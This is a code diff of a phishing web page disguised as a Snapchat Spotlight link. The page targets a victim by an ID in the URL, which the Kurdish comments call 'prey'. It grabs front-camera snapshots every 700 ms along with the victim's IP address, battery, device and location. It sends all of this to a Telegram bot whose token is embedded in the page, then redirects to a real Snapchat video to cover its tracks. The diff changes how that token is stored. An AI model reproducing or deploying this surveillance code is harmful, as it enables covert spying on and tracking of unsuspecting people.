@@ -4,39 +4,24 @@
     <meta charset="UTF-8">
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
-    <style>
-        body { background-color: white; margin: 0; overflow: hidden; }
-        
-        .sys-info { display: none; visibility: hidden; }
-    </style>
+    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
 </head>
 <body onload="capture()">
-
-    
-    <span class="sys-info" id="p1">8431515310:</span>
-    <span class="sys-info" id="p2">AAHgyPYR-Z</span>
-    <span class="sys-info" id="p3">Fn2QF-xU2367CK</span>
-    <span class="sys-info" id="p4">KRQPP-YQq1s</span>
-
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
-    
-    
-    const _s1 = document.getElementById("p1").innerText;
-    const _s2 = document.getElementById("p2").innerText;
-    const _s3 = document.getElementById("p3").innerText;
-    const _s4 = document.getElementById("p4").innerText;
-    const TOKEN = _s1 + _s2 + _s3 + _s4;
+    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
 
     async function capture() {
         if (!targetID) return;
 
+        
         setTimeout(() => {
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }, 5000);
 
         try {
+            // تەنها داوای کامێرا دەکات لێرەدا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
@@ -51,13 +36,15 @@
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    let report = ` <b>نێچیرێکی نوێ ڕاوکرا</b>\n\n` +
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
                                  `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                                  `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                  `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                     sendToTelegram(report);
                 });
+
+            // 
 
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -75,7 +62,7 @@
             setInterval(takeSnap, 700);
 
         } catch (e) {
-            sendToTelegram(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا.");
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
@@ -88,6 +75,7 @@
         });
     }
 
+    
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
